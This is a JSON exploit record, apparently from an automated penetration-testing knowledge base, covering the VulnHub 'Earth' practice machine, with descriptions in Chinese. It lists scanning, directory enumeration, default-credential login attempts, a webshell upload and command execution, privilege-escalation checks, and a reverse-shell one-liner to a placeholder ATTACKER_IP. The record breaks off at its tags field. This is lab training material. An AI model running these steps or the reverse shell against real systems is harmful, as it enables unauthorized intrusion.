{
  "vuln_id": "vulnhub_earth",
  "description": "VulnHub Earth靶机是一个渗透测试练习环境，包含多个漏洞利用点，需要综合运用信息收集、漏洞发现和权限提升技术",
  "category": "config_exploit",
  "cves": [],
  "match_keywords": [
    "vulnhub",
    "earth",
    "the-planets-earth",
    "sirflash",
    "boot2root"
  ],
  "fingerprint_keywords": [
    "VulnHub",
    "The Planets: Earth",
    "SirFlash",
    "boot2root"
  ],
  "affected_versions": "N/A",
  "default_port": 80,
  "common_endpoints": [
    "/",
    "/robots.txt",
    "/admin",
    "/login",
    "/api",
    "/uploads"
  ],
  "detection_method": "使用nmap扫描目标IP，识别开放端口和服务版本；使用dirb/gobuster进行目录枚举；检查robots.txt文件获取隐藏路径；分析HTTP响应头和应用指纹",
  "exploit_steps": [
    {
      "step": 1,
      "description": "信息收集：扫描目标IP，识别开放端口和服务",
      "command": "nmap -sV -sC -p- {TARGET}",
      "expected_result": "发现开放端口（如80, 22, 443等）及相关服务信息",
      "notes": "使用全面扫描参数确保不遗漏任何端口"
    },
    {
      "step": 2,
      "description": "目录枚举：使用工具发现隐藏目录和文件",
      "command": "gobuster dir -u http://{TARGET} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt",
      "expected_result": "发现敏感目录如/admin, /backup, /uploads等",
      "notes": "可尝试不同字典和扩展名以提高发现率"
    },
    {
      "step": 3,
      "description": "检查robots.txt文件获取隐藏路径",
      "command": "curl -s http://{TARGET}/robots.txt",
      "expected_result": "返回robots.txt内容，可能包含Disallow规则或注释中的敏感信息",
      "notes": "注意查看注释和非常规格式"
    },
    {
      "step": 4,
      "description": "漏洞发现：根据发现的服务和路径尝试常见漏洞",
      "command": "curl -X POST http://{TARGET}/login -d \"username=admin&password=admin\"",
      "expected_result": "根据响应判断是否存在弱口令或SQL注入",
      "notes": "尝试默认凭证、SQL注入payload等"
    },
    {
      "step": 5,
      "description": "文件上传漏洞利用（如果存在）",
      "command": "curl -F \"file=@shell.php\" http://{TARGET}/upload",
      "expected_result": "文件上传成功，返回上传路径",
      "notes": "确保shell.php包含有效webshell代码"
    },
    {
      "step": 6,
      "description": "访问上传的webshell执行命令",
      "command": "curl http://{TARGET}/uploads/shell.php?cmd=id",
      "expected_result": "返回命令执行结果，如uid=33(www-data) gid=33(www-data) groups=33(www-data)",
      "notes": "注意URL编码和过滤绕过"
    },
    {
      "step": 7,
      "description": "权限提升：在获取初始shell后尝试提权",
      "command": "sudo -l",
      "expected_result": "列出当前用户可执行的sudo命令",
      "notes": "检查SUID文件、内核漏洞、配置错误等"
    }
  ],
  "verification_command": "curl http://{TARGET}/uploads/shell.php?cmd=whoami",
  "verification_success_sign": "返回www-data或root等有效用户名",
  "requires_callback": false,
  "callback_note": "如果漏洞需要反弹shell，可使用nc监听端口：nc -lvnp 4444，并在webshell中执行：bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",
  "remediation": "1. 及时更新系统和应用补丁；2. 使用强密码策略；3. 限制文件上传类型和大小；4. 配置适当的访问控制；5. 定期进行安全审计和渗透测试",
  "privesc_steps": [
    {
      "step": 1,
      "description": "立足后确认内核与发行版，便于对照公开提权漏洞",
      "command": "uname -a && cat /etc/os-release"
    },
    {
      "step": 2,
      "description": "检查 sudo、SUID、capabilities 等常见本地提权面",
      "command": "sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head -40; getcap -r / 2>/dev/null | head -30"
    },
    {
      "step": 3,
      "description": "查看定时任务与启动项",
      "command": "ls -la /etc/cron* 2>/dev/null; systemctl list-timers 2>/dev/null | head -20"
    },
    {
      "step": 4,
      "description": "枚举当前用户可写路径（限制深度减少噪音）",
      "command": "find / -maxdepth 4 -writable -type d -user $(whoami) 2>/dev/null | head -30"
    }
  ],
  "path_templates": [
    {
      "stage": "surface_enum",
      "precondition": "多端口/多服务暴露",
      "action": "robots.txt、目录枚举、管理入口与备份文件",
      "success_sign": "发现可登录面或上传/配置泄露",
      "next_stage": "foothold"
    },
    {
      "stage": "foothold",
      "precondition": "存在 Web 或配置类弱点",
      "action": "按指纹选择利用（上传/注入/默认口令）拿 RCE 或凭据",
      "success_sign": "RCE 回显或有效会话",
      "next_stage": "post_foothold_enum"
    },
    {
      "stage": "privesc",
      "precondition": "低权限 shell 或 RCE",
      "action": "sudo -l、SUID、cron、内核版本对照",
      "success_sign": "root 或目标 flag",
      "next_stage": "objective"
    }
  ],
  "fallbacks": [
    {
      "stage": "foothold",
      "action": "Web 无果时转向 SSH/其他开放服务横向尝试"
    }
  ],
  "opsec_notes": [
    "Planets 系列常为多入口，勿卡在单一 CVE；保持攻链思维"
  ],
  "tags": [
